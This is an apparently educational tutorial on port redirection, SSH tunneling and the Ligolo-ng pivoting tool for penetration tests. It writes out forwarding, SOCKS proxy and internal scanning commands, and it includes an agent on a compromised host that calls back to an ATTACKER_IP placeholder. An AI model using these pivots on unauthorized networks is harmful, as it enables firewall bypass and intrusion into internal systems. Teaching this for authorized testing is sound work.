# 🔁 1. What is Port Redirection?

## 🔹 Simple Explanation

Port redirection means:

> Taking traffic coming to one port and forwarding it to another port (same machine or another machine).

Think of it like:

* Someone knocks on **Door A**
* You silently redirect them to **Door B**

The visitor doesn’t know they were redirected.

---

## 🔹 Why is it used in Ethical Hacking?

During internal penetration tests:

* You compromise Machine A.
* Machine A can access Machine B (internal network).
* But you (the attacker machine) cannot access Machine B directly.

So you use Machine A to forward traffic to Machine B.

That is **port redirection**.

---

## 🔹 Practical Example

### Scenario

You compromised:

```
Victim1 (192.168.1.10)
```

Inside that network is:

```
Internal Server (10.10.10.5) running MySQL on port 3306
```

You cannot access `10.10.10.5` directly from your attacker machine.

---

### Solution: Use Port Forwarding

On Victim1 (compromised machine):

```bash
ssh -L 3306:10.10.10.5:3306 attacker@your_machine
```

Or using netcat/socat:

```bash
socat TCP-LISTEN:4444,fork TCP:10.10.10.5:3306
```

Now when you connect to:

```
Victim1:4444
```

It redirects traffic to:

```
10.10.10.5:3306
```

You can now access the internal MySQL server.

---

# 🌉 2. What is Tunneling?

## 🔹 Simple Explanation

Tunneling is:

> Creating a secure communication path through another system to reach hidden/internal systems.

Think of it like:

You build a secret tunnel under a wall to access a restricted area.

---

## 🔹 Why is it important?

In real corporate environments:

* Internal networks are not exposed to the internet
* Firewalls block direct access
* You need to pivot through a compromised host

Tunneling allows:

✔ Bypassing firewalls
✔ Accessing internal networks
✔ Pivoting
✔ Running internal scans

---

## 🔹 Example of SSH Tunneling

### Local Port Forwarding

```bash
ssh -L 8080:10.10.10.5:80 user@victim1
```

This means:

```
Your Machine:8080 → Victim1 → 10.10.10.5:80
```

Now visit:

```
http://localhost:8080
```

And you access internal web server 10.10.10.5.

---

### Dynamic Port Forwarding (SOCKS Proxy)

```bash
ssh -D 9050 user@victim1
```

Now configure proxychains:

```
socks5 127.0.0.1 9050
```

Now you can scan internal machines using:

```bash
proxychains nmap 10.10.10.0/24
```

This is tunneling.

---

# 🔄 3. Port Redirection vs Tunneling

| Port Redirection       | Tunneling                    |
| ---------------------- | ---------------------------- |
| Forwards one port      | Can forward many ports       |
| Simple                 | More flexible                |
| Basic pivot            | Advanced pivot               |
| Usually single service | Full network access possible |

---

# 🚀 4. What is Ligolo-ng?

Now we move to modern red teaming tool: **Ligolo-ng**

---

## 🔹 What is Ligolo-ng?

Ligolo-ng is:

> A modern, lightweight tunneling tool used for pivoting inside internal networks.

It allows you to:

✔ Create reverse tunnels
✔ Pivot easily
✔ Route entire subnets
✔ Scan internal networks like you’re inside

And it does NOT require admin privileges in many cases.

---

## 🔹 Why Ligolo-ng is Popular?

Compared to:

* SSH tunneling
* Chisel
* Meterpreter

Ligolo-ng is:

✔ Faster
✔ More stable
✔ Works with raw TCP
✔ Works well with Nmap
✔ Easy to use

---

# 🧠 How Ligolo-ng Works (Simple)

It uses:

* **Agent** → runs on compromised machine
* **Proxy/Server** → runs on attacker machine

The agent connects back to you.

Then you can create a virtual interface and route traffic through it.

---

# 🔥 Ligolo-ng Practical Example

---

## 🖥 Scenario

You compromised:

```
Victim1 (192.168.1.10)
```

Victim1 can access:

```
Internal Network: 10.10.10.0/24
```

You cannot access it directly.

---

## Step 1: Start Ligolo Proxy on Attacker

```bash
./proxy -selfcert
```

---

## Step 2: Run Agent on Victim

On compromised machine:

```bash
./agent -connect ATTACKER_IP:11601 -ignore-cert
```

Now Victim connects to you.

---

## Step 3: Create Tunnel Interface

On attacker machine:

```bash
interface_create
```

Then:

```bash
interface_up
```

Add route:

```bash
sudo ip route add 10.10.10.0/24 dev ligolo
```

---

## Step 4: Scan Internal Network

Now you can directly run:

```bash
nmap 10.10.10.5
```

And it will scan through the tunnel.

You are now virtually inside the network.

---

# 🔍 Why Ligolo-ng is Better Than Basic SSH?

| SSH Tunnel          | Ligolo-ng             |
| ------------------- | --------------------- |
| Per-port forwarding | Full subnet routing   |
| Slower              | Faster                |
| Needs SSH access    | Just agent execution  |
| Limited             | Great for red teaming |

---

# 🧪 Real Ethical Hacking Use Case

During internal penetration test:

1. Gain initial access (phishing / exploit)
2. Drop Ligolo agent
3. Create tunnel
4. Scan internal AD servers
5. Perform enumeration
6. Escalate privileges

This is called **pivoting**.

---

# ⚠️ Important Ethical Note

These techniques:

* Should only be used in:

  * Lab environments
  * Bug bounty scope
  * Authorized penetration tests

Never use on systems without written permission.

---

# 🧠 Summary

### Port Redirection

Forward one port to another.

### Tunneling

Create secure path to access hidden networks.

### Ligolo-ng

Modern pivoting tool that allows routing full internal networks through compromised hosts.

